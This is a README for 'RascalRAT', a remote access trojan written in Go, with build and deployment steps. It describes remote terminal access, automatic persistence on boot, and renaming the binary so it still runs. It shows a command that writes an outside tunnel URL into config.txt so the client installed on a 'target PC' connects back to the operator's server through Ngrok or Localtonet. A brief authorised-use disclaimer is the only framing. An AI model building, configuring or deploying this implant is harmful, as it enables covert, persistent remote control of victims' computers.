# RascalRAT

RascalRAT is a RAT(Remote Administrative Tool specifically), not intended for malicious purposes. 
USE IT ON AUTHORISED COMPUTERS ONLY!
---

## Features

* Remote Terminal Execution: RascalRAT is made purposely for gaining Terminal access remotely, with a UI for easier and faster execution

* Persistence: RascalRAT auto registers itself in the list of `Auto-start-on-boot` apps, which survives reboot

* Stable: Very easy to install and use. Less noise, less CPU spikes, stable and can connect to remote panel anytime it comes online

---

## Installation

### Build from source
**Prerequisites that needs to be installed are:** 

- `GNU Make` 
- `Golang 1.25.0`

```bash
# 1. Clone this repository
gh repo clone the-hollowclan/RascalRAT # Using Github CLI

# 2. Open the folder
cd RascalRAT

# 3. Build the binaries
make build
## After building, install the client.exe on the target PC

# 4. Start the client
clear && ./bin/server
```

---

## How to configure

1. Without a remote server, you can't manage remote devices, Setup a Domain or Tunnel URL and store it in config.txt with the command below or manually:

```bash
# replace the URL with your Tunnel URL
echo "https://s5kz6tdx9.localto.net/ws/connect?id=windows-pc-1" > config.txt
```

2. Build again to make sure that the Makefile process ports the new config.txt into the executable binary

```bash
make build
```

3. After the build the resulting RAT is stored at `bin/client.exe`, run it once on the target PC and it gets stored in the OS to work permanently. (Note: You can rename the executabble file, it'd work just fine)

4. Start the RAT server on your own localhost with the command below so that the client can connect to it through the tunnel URL

```bash
# execute
./bin/server
```
5. Make sure you have started your preferred Tunnel, such as Localtonet, Ngrok, etc.

---

## Contributions:

Contributions are welcomed

---

## Consent

Do not use RascalRAT to monitor and administer desktops illegitimately or unauthorised.
The collaborators of this project won't be held accountable for your mmisuse